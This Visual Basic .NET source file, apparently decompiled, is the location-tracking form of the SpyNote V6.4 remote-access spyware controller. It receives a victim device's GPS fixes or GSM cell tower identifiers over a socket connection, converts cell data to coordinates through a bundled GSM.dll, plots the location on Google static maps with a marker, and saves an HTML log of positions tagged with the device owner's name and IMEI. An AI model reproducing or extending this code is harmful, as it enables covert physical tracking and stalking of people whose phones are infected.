Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Net
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class LocationManager
    Public TClient As SocketClient

    Private Lit As Double

    Private Lon As Double

    Private s As Boolean

    Private v As Boolean

    Private w As Boolean

    Private bolStats As Boolean

    Private SaveTitle As StringBuilder

    Private SaveColumns As StringBuilder

    Private SaveRows As StringBuilder

    Private ia As Boolean

    Private lnk As String

    Private zoom As Integer

    Private clrSplit As Color

    Public Sub New()
        Me.SaveTitle = New StringBuilder()
        Me.SaveColumns = New StringBuilder()
        Me.SaveRows = New StringBuilder()
        Me.wc2 = New WebClient()
        Me.lnk = "-1"
        Me.zoom = 15
        Me.clrSplit = Color.FromArgb(255, 63, 63, 70)
        Me.InitializeComponent()
    End Sub
    Private Sub BTNMIN_Click(sender As Object, e As EventArgs) Handles BTNMIN.Click
        Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.MapBox.Tag, "GO", False)
        If flag Then
            Me.zoom -= 1
            Dim flag2 As Boolean = Me.zoom <= 1
            If flag2 Then
                Me.zoom = 1
            End If
            Me.REMap()
        End If
    End Sub
    Private Sub BTNSty_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNSty.Click
        If (Operators.ConditionalCompareObjectEqual(Me.MapBox.Tag, "GO", False)) Then
            If (Not Operators.ConditionalCompareObjectEqual(Me.BTNSty.Tag, "0", False)) Then
                Me.BTNSty.Tag = "0"
                Me.LABSty.Text = "Roadmap"
                Me.BTNSty.ImageChoice = Store.Bitmap_0("Location\roadmap")
                Me.BTNSty.ShowImage = True
            Else
                Me.BTNSty.Tag = "1"
                Me.LABSty.Text = "Satellite"
                Me.BTNSty.ImageChoice = Store.Bitmap_0("Location\satellite")
                Me.BTNSty.ShowImage = True
            End If
            Me.LABSty.Refresh()
            Me.BTNSty.Refresh()
            Me.REMap()
        End If
    End Sub
    Private Sub BTNZay_Click(sender As Object, e As EventArgs) Handles BTNZay.Click
        Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.MapBox.Tag, "GO", False)
        If flag Then
            Me.zoom += 1
            Dim flag2 As Boolean = Me.zoom >= 21
            If flag2 Then
                Me.zoom = 21
            End If
            Me.REMap()
        End If
    End Sub
    Private Sub d(ByVal img As Image)
        If (Not MyBase.InvokeRequired) Then
            Me.MapBox.Image = img
            Me.MapBox.Invalidate()
            Me.MapBox.Tag = "GO"
        Else
            MyBase.Invoke(New LocationManager.Delegate1(AddressOf Me.d), New Image() {img})
        End If
    End Sub
    Private Sub DownloadDataCallback(ByVal sender As Object, ByVal e As DownloadDataCompletedEventArgs)
        Dim memoryStream As System.IO.MemoryStream = New System.IO.MemoryStream()
        Dim userState As AutoResetEvent = DirectCast(e.UserState, AutoResetEvent)
        Try
            If (If(e.Cancelled, False, e.[Error] Is Nothing)) Then
                Dim result As Byte() = e.Result
                memoryStream.Write(result, 0, CInt(result.Length))
            End If
        Finally
            Try
                If (memoryStream.Length > CLng(0)) Then
                    Me.d(Image.FromStream(memoryStream))
                End If
            Catch exception As System.Exception
            End Try
            Me.MAPProgressBar1.Value = 0
            userState.[Set]()
        End Try
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.wc2.Dispose()
        Catch exception As System.Exception
        End Try
        Me.bolStats = False
    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Me.bolStats = True
        Dim thread As System.Threading.Thread = New System.Threading.Thread(New ThreadStart(AddressOf Me.go)) With
        {
            .Priority = ThreadPriority.Normal,
            .IsBackground = True
        }
        thread.Start()
    End Sub

    Private Function GMap(ByVal Latitude As Double, ByVal Longitude As Double, ByVal Zoom As Integer, ByVal h As Integer, ByVal w As Integer, ByVal st As String) As String
        Return String.Concat(New String() {"https://maps.googleapis.com/maps/api/staticmap?center=", Conversions.ToString(Latitude), ",", Conversions.ToString(Longitude), "&zoom=", Conversions.ToString(Zoom), "&size=", Conversions.ToString(h), "x", Conversions.ToString(w), "&maptype=", st, "&markers=color:red%7Clabel:S%7C", Conversions.ToString(Latitude), ",", Conversions.ToString(Longitude), "&key=", Data.OptionsLines(4).ToString().Trim()})
    End Function

    Private Sub go()
        Try
            While Me.bolStats
                Thread.Sleep(1)
                If (Me.ia) Then
                    If (Operators.CompareString(Me.lnk, "-1", False) <> 0) Then
                        Dim autoResetEvent As System.Threading.AutoResetEvent = New System.Threading.AutoResetEvent(False)
                        AddHandler Me.wc2.DownloadDataCompleted, New DownloadDataCompletedEventHandler(AddressOf Me.DownloadDataCallback)
                        Me.wc2.DownloadDataAsync(New Uri(Me.lnk), autoResetEvent)
                        autoResetEvent.WaitOne()
                        Me.wc2.Dispose()
                        Me.lnk = "-1"
                    End If
                    Me.ia = False
                End If
            End While
        Catch exception As System.Exception
            Return
        End Try
    End Sub
    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub LocationManager_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        If (Me.SaveRows.Length > 0) Then
            Store.StartThread(DirectCast((New Object() {Me.SaveTitle, Me.SaveColumns, Me.SaveRows, String.Concat(Me.TClient.ClientName, "_", Me.TClient.ClientImei), "LocationManager"}), Array))
        End If
        Me.TClient.Send(Store.BFF(Store.buff, CLng(23)))
    End Sub

    Private Sub LocationManager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\4.ico"))
        Me.BTNZay.ImageChoice = Store.Bitmap_0("Location\Zoom1")
        Me.BTNZay.ShowImage = True
        Me.BTNMIN.ImageChoice = Store.Bitmap_0("Location\Zoom0")
        Me.BTNMIN.ShowImage = True
        Me.BTNSty.ImageChoice = Store.Bitmap_0("Location\roadmap")
        Me.BTNSty.ShowImage = True
        Me.MapBox.ErrorImage = Store.Bitmap_0("Location\ErrorImage")
        Me.MapBox.InitialImage = Store.Bitmap_0("Location\InitialImage")
        Me.BTNSty.Refresh()
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub LocationManager_LocationChanged(ByVal sender As Object, ByVal e As EventArgs) Handles Me.LocationChanged
        Me.Panel1.Invalidate()
    End Sub

    Private Sub LocationManager_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.Panel1.Invalidate()
    End Sub

    Private Sub MapBox_MouseEnter(ByVal sender As Object, ByVal e As EventArgs) Handles MapBox.MouseEnter
        Me.MapBox.Focus()
    End Sub
    Private Sub MapBox_MouseWheel(sender As Object, e As MouseEventArgs) Handles MapBox.MouseWheel
        Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.MapBox.Tag, "GO", False)
        If flag Then
            Dim flag2 As Boolean = e.Delta < 0
            If flag2 Then
                Me.zoom -= 1
                Dim flag3 As Boolean = Me.zoom <= 1
                If flag3 Then
                    Me.zoom = 1
                End If
                Me.REMap()
            Else
                Dim flag4 As Boolean = e.Delta > 0
                If flag4 Then
                    Me.zoom += 1
                    Dim flag5 As Boolean = Me.zoom >= 21
                    If flag5 Then
                        Me.zoom = 21
                    End If
                    Me.REMap()
                End If
            End If
        End If
    End Sub
    Private Sub MapBox_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles MapBox.Paint
        If (Me.MapBox.Image IsNot Nothing) Then
            If (Me.MapBox.Image.Size.Width > 24 And Me.MapBox.Image.Size.Height > 24) Then
                If (Me.s) Then
                    Dim num As Integer = CInt(Math.Round(CDbl(Me.MapBox.Width) / 2))
                    Dim num1 As Integer = CInt(Math.Round(CDbl(Me.MapBox.Height) / 2))
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias
                    Dim pen As System.Drawing.Pen = New System.Drawing.Pen(Color.FromArgb(80, 241, 128, 118), 40.0!)
                    e.Graphics.DrawEllipse(pen, num - 20, num1 - 20, 40, 40)
                End If
            End If
        ElseIf (Me.v) Then
            Dim white As Brush = Brushes.White
            Dim font As System.Drawing.Font = New System.Drawing.Font("Consolas", 8.25!, FontStyle.Bold)
            e.Graphics.DrawString("waiting...", font, white, 10.0!, 10.0!)
        End If
    End Sub

    Private Sub Panel1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles Panel1.Paint
        ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, Me.clrSplit, ButtonBorderStyle.Dashed)
    End Sub

    Private Sub REMap()
        Me.LBLZOOM.Text = String.Concat("ZOOM:", Conversions.ToString(Store.RateConverter(Me.zoom, 21)), "%")
        Me.lnk = Me.GMap(Me.Lit, Me.Lon, Me.zoom, 300, 300, If(Operators.ConditionalCompareObjectEqual(Me.BTNSty.Tag, "0", False), "hybrid", "roadmap"))
        Me.ia = True
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(106)), False) = 0) Then
                Me.v = True
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(105)), False) = 0) Then
                If (Not Me.w) Then
                    Me.SaveTitle.Append(String.Concat("<title>Spy Note - ", MyBase.Name, "</title>"))
                    Me.SaveColumns.Append("</tr><th>Accuracy</th><th>Provider</th><th>Location</th><tr>")
                    Me.w = True
                End If
                Me.v = False
                Dim assembly As System.Reflection.Assembly = System.Reflection.Assembly.LoadFrom(String.Concat(Store.Resources(1), "\Imports\Gsm\GSM.dll"))
                Dim type As System.Type = assembly.[GetType]("GoogleMapsApi")
                Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type))
                Dim [integer] As Integer = Conversions.ToInteger(Ay.GetValue(1).ToString().Trim())
                Dim num As Integer = Conversions.ToInteger(Ay.GetValue(2).ToString().Trim())
                Dim integer1 As Integer = Conversions.ToInteger(Ay.GetValue(4).ToString().Trim())
                Dim num1 As Integer = Conversions.ToInteger(Ay.GetValue(3).ToString().Trim())
                Dim str As String = "0.0"
                Dim str1 As String = "GSM"
                Dim objArray() As Object = {[integer], num, integer1, num1}
                Dim objArray1 As Object() = objArray
                Dim flagArray() As Boolean = {True, True, True, True}
                Dim flagArray1 As Boolean() = flagArray
                Dim obj As Object = NewLateBinding.LateGet(objectValue, Nothing, "GetLatLng", objArray, Nothing, Nothing, flagArray)
                If (flagArray1(0)) Then
                    [integer] = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1(0)), GetType(Integer)))
                End If
                If (flagArray1(1)) Then
                    num = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1(1)), GetType(Integer)))
                End If
                If (flagArray1(2)) Then
                    integer1 = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1(2)), GetType(Integer)))
                End If
                If (flagArray1(3)) Then
                    num1 = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1(3)), GetType(Integer)))
                End If
                Dim strArrays As String() = DirectCast(obj, String())
                If (Operators.CompareString(strArrays(0), "-1", False) <> 0 And Operators.CompareString(strArrays(1), "-1", False) <> 0) Then
                    Me.LABAccuracyAccuracy.Text = String.Concat("Accuracy:", str)
                    Me.LABProvider.Text = String.Concat("Provider:", str1)
                    Me.Lit = Conversions.ToDouble(strArrays(0))
                    Me.Lon = Conversions.ToDouble(strArrays(1))
                    Me.REMap()
                    Me.s = True
                    Dim str2 As String = String.Concat(New String() {"https://www.google.com/maps/dir/", Conversions.ToString(Me.Lit), ",", Conversions.ToString(Me.Lon), "/@", Conversions.ToString(Me.Lit), ",", Conversions.ToString(Me.Lon), ",17z"})
                    Me.SaveRows.Append(String.Concat(New String() {"</tr> <td>", str, "</td><td>", str1, "</td><td><a href=""", str2, """>Show Map&nbsp;</a></td><tr>" & vbCrLf & ""}))
                End If
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(107)), False) = 0) Then
                If (Not Me.w) Then
                    Me.SaveTitle.Append(String.Concat("<title>Spy Note - ", MyBase.Name, "</title>"))
                    Me.SaveColumns.Append("</tr><th>Accuracy</th><th>Provider</th><th>Location</th><tr>")
                    Me.w = True
                End If
                Me.v = False
                Dim str3 As String = Ay.GetValue(1).ToString().Trim()
                Dim str4 As String = Ay.GetValue(2).ToString().Trim()
                Dim str5 As String = Ay.GetValue(4).ToString().Trim()
                Dim str6 As String = Ay.GetValue(3).ToString().Trim()
                If (Versioned.IsNumeric(str3) And Versioned.IsNumeric(str3)) Then
                    Me.LABAccuracyAccuracy.Text = String.Concat("Accuracy:", str5)
                    Me.LABProvider.Text = String.Concat("Provider:", str6)
                    Me.Lit = Conversions.ToDouble(str3)
                    Me.Lon = Conversions.ToDouble(str4)
                    Me.REMap()
                    Me.s = True
                    Dim str7 As String = String.Concat(New String() {"https://www.google.com/maps/dir/", Conversions.ToString(Me.Lit), ",", Conversions.ToString(Me.Lon), "/@", Conversions.ToString(Me.Lit), ",", Conversions.ToString(Me.Lon), ",17z"})
                    Me.SaveRows.Append(String.Concat(New String() {"</tr> <td>", str5, "</td><td>", str6, "</td><td><a href=""", str7, """>Show Map&nbsp;</a></td><tr>" & vbCrLf & ""}))
                End If
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0) Then
                Me.bolStats = False
                Me.v = False
                Me.LBER.Text = CStr(Ay.GetValue(1))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
                Me.MapBox.Invalidate()
            End If
        Catch exception As System.Exception
            Me.TClient.Send(Store.BFF(Store.buff, CLng(23)))
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(73)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub
    Public _wc2 As WebClient
    Private Property wc2 As WebClient
        Get
            Return Me._wc2
        End Get
        Set(value As WebClient)
            Dim value2 As DownloadProgressChangedEventHandler = AddressOf Me.wc2_DownloadProgressChanged1
            Dim wc As WebClient = Me._wc2
            If wc IsNot Nothing Then
                RemoveHandler wc.DownloadProgressChanged, value2
            End If
            Me._wc2 = value
            wc = Me._wc2
            If wc IsNot Nothing Then
                AddHandler wc.DownloadProgressChanged, value2
            End If
        End Set
    End Property
    Private Sub wc2_DownloadProgressChanged1(ByVal sender As Object, ByVal e As DownloadProgressChangedEventArgs)
        Try
            Me.MAPProgressBar1.Maximum = 100
            Me.MAPProgressBar1.Value = e.ProgressPercentage
        Catch exception As System.Exception
        End Try
    End Sub

    Public Delegate Sub Delegate1(ByVal img As Image)
End Class